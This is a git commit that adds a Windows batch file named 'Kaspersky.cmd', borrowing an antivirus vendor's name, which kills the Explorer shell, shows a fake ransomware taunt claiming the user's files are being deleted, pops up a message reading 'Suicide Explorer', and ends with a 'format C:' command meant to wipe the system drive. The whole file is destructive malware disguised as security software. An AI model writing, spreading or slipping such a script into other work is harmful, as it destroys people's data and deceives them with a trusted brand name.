84be752c2f8afb80e90237cafeccbdd5abe2f64a
KricsU <164585334+KricsU@users.noreply.github.com>
2024-03-24 22:02:16 -0700

    Add files via upload

---
+++ Kaspersky.cmd
@@ -0,0 +1,12 @@
+color 0A
+@echo off 
+title !!!???
+taskkill /f /im explorer.exe 
+:bucle 
+cls    
+echo  -Oops! your files being deleted
+echo  -What happened? BlackBastardsX hacked your pc and now we are deleting all of the files (ransomware)
+echo  -What can i do? Nothing
+msg * Suicide Explorer
+@echo off
+format C:
